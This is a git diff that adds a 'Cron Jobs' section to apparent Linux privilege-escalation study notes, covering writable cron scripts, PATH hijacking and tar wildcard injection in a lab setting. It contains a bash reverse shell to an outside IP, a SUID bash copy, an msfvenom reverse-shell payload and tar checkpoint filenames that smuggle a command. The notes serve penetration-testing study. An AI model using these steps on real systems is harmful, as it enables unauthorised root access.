@@ -195,7 +195,9 @@ Hacking linux
     - [Limitations](#Limitations)
   - [LD LIBRARY PATH](#LD-LIBRARY-PATH)
 - [Cron Jobs](#Cron-Jobs)
-  
+  - [File Permissions](#File-Permissions)
+  - [PATH Environment Variable](#PATH-Environment-Variable)
+  - [Wildcards](#Wildcards)
   
 -------------------------------------------------------------------------------------------------------------------------------------------------------
 - [Linux Privilige Escalation 1](#Linux-Privilige-Escalation-1)
@@ -3264,6 +3266,199 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ### Cron Jobs
+
+ron jobs are programs or scripts which users can schedule to
+run at specific times or intervals.
+Cron jobs run with the security level of the user who owns
+them.
+By default, cron jobs are run using the /bin/sh shell, with
+limited environment variables.
+
+Cron table files (crontabs) store the configuration for
+cron jobs.
+User crontabs are usually located in /var/spool/cron/ or
+/var/spool/cron/crontabs/
+The system-wide crontab is located at /etc/crontab.
+
+## File Permissions
+Misconfiguration of file permissions associated with cron jobs
+can lead to easy privilege escalation.
+If we can write to a program or script which gets run as part of
+a cron job, we can replace it with our own code.
+
+## Privilege Escalation
+1. View the contents of the system-wide crontab:
+```
+$ cat /etc/crontab
+...
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+```
+2. Locate the overwrite.sh file on the server:
+```
+$ locate overwrite.sh
+/usr/local/bin/overwrite.sh
+```
+3.
+Check the file’s permissions:
+```
+$ ls -l /usr/local/bin/overwrite.sh
+-rwxr--rw- 1 root staff 40 May 13 2017 /usr/local/bin/overwrite.sh
+```
+Note that the file is world writable.
+4.
+Replace the contents of the overwrite.sh file with the following:
+```
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.1.26/53 0>&1
+```
+
+5.
+Run a netcat listener on your local machine and wait for
+the cron job to run. A reverse shell running as the root
+user should be caught:
+```
+# nc –nvlp 53
+Listening on [any] 53 ...
+Connect to [192.168.1.26] from (UNKNOWN) [192.168.1.25] 47352
+bash: no job control in this shell
+root@debian:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## PATH Environment Variable
+The crontab PATH environment variable is by default set to
+/usr/bin:/bin
+The PATH variable can be overwritten in the crontab file.
+If a cron job program/script does not use an absolute path, and one
+of the PATH directories is writable by our user, we may be able to
+create a program/script with the same name as the cron job.
+
+## Privilege Escalation
+1.
+View the contents of the system-wide crontab:
+```
+$ cat /etc/crontab
+...
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/
+usr/bin
+...
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+```
+Note that the /home/user directory (which we can write to) is at the start
+of the PATH variable, and the first cron job does not use an absolute path.
+
+2.
+Create the file overwrite.sh in /home/user with the following
+contents:
+```#!/bin/bash
+cp /bin/bash /tmp/rootbash
+```
+chmod +s /tmp/rootbash
+3.
+Ensure that overwrite.sh is executable:
+```
+$ chmod +x /home/user/overwrite.sh
+```
+4.Wait for the cronjob to run (this job in particular runs
+every minute).
+5.Once the /tmp/rootbash file is created, execute it (with
+-p to preserve the effective UID) to gain a root shell:
+```
+$ /tmp/rootbash –p
+rootbash-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
+groups=0(root) ...
+```
+
+## Wildcards
+When a wildcard character (*) is provided to a command as part of an
+argument, the shell will first perform filename expansion (also known as
+globbing) on the wildcard.
+This process replaces the wildcard with a space-separated list of the file
+and directory names in the current directory.
+An easy way to see this in action is to run the following command from
+your home directory:
+```
+$ echo *
+```
+
+## Wildcards & Filenames
+Since filesystems in Linux are generally very permissive with filenames,
+and filename expansion happens before the command is executed, it is
+possible to pass command line options (e.g. -h, --help) to commands by
+creating files with these names.
+The following commands should show how this works:
+```
+$ ls *
+% touch ./-l
+$ ls *
+```
+
+## Wildcards & Filenames (cont.)
+Filenames are not simply restricted to simple options like -h or
+--help.
+In fact we can create filenames that match complex options:
+--option=key=value
+GTFOBins (https://gtfobins.github.io) can help determine
+whether a command has command line options which will be
+useful for our purposes.
+
+
+## Privilege Escalation
+1.
+View the contents of the system-wide crontab:
+```
+$ cat /etc/crontab
+...
+* * * * * root /usr/local/bin/compress.sh
+```
+2.
+View the contents of the /usr/local/bin/compress.sh file:
+```
+$ cat /usr/local/bin/compress.sh
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+Note that the tar command is run with a wildcard in the /home/user directory.
+
+3. GTFOBins shows that tar has command line options
+which can be used to run other commands as part
+of a checkpoint feature.
+4. Use msfvenom to create a reverse shell ELF payload:
+```
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=53 -f elf
+-o shell.elf
+```
+
+5. Copy the file to the /home/user directory on the
+remote host and make it executable:
+```
+$ chmod +x /home/user/shell.elf
+
+6. Create two files in the /home/user directory:
+```
+$ touch /home/user/--checkpoint=1
+$ touch /home/user/--checkpoint-action=exec=shell.elf
+```
+
+7. Run a netcat listener on your local machine and
+wait for the cron job to run. A reverse shell running
+as the root user should be caught:
+```
+# nc -nvlp 53
+listening on [any] 53 ...
+connect to [192.168.1.26] from (UNKNOWN) [192.168.1.25] 47362
+bash: no job control in this shell
+root@debian:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Linux Privilige Escalation 1
